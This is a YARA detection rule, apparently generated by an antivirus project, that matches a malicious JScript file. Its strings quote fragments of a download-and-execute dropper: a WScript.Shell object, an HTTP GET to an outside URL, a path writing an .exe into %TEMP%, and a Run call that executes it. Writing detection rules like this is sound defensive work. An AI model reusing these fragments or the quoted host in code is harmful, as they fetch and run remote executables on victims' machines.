rule sig_20160328_3a6b429259bc029c8e6bb661371c030d {
  meta:
    description = "datamaliciousorder - file 20160328_3a6b429259bc029c8e6bb661371c030d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fd3d2471b9a066ae646b2eee2384da16710ed35c8c79efa2381d57e93e26c84a"

  strings:
    $s1  = "function Doikrri() {return Scilxupj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"DHoTyEXu.exe\";};" fullword ascii
    $s2  = "do {WScript[Usdkzod](Euusny() * 11)} while (Qtgpguajw[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Tzgmdew(Hvexow, Nnjotvtskp){return Hvexow - Nnjotvtskp;};" fullword ascii
    $s4  = "Qtgpguajw[Pjmbuayh](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s5  = "var Scilxupj = function Ajqqnnqj() {return WScript[Uiudos](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Isobfes() {return ((Xzuyaqgyw == true) && (Xzuyaqgyw == Bfonlde)) ? 1 : Gicbywfz;};" fullword ascii
    $s7  = "function Bxjbfkyz(Gwnvfvqqp){Scilxupj[\"Run\"](Gwnvfvqqp, Gicbywfz, Gicbywfz);};" fullword ascii
    $s8  = "Bfonlde = true; " fullword ascii
    $s9  = "Xzuyaqgyw = true; " fullword ascii
    $s10 = "return Tzgmdew(Tmlbxdvcjr, Jcsgeu);" fullword ascii
    $s11 = "var Bfonlde = false;" fullword ascii
    $s12 = "var Ijimrvw = new this[\"Date\"]();" fullword ascii
    $s13 = "var Somriok = false;" fullword ascii
    $s14 = "var Xzuyaqgyw = false;" fullword ascii
    $s15 = "function Dcrhcqc(Zpichgk) {var Jsuogew = (1, 2, 3, 4, 5, Zpichgk); return Jsuogew;};" fullword ascii
    $s16 = "function Euusny(){return 22;};" fullword ascii
    $s17 = "function Xzcobslpz(){return Lmaemm;};" fullword ascii
    $s18 = "function Lbgqqowy()" fullword ascii
    $s19 = " while (Sosjrwc){" fullword ascii
    $s20 = "function Dmobbeq(){return Uiudos;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}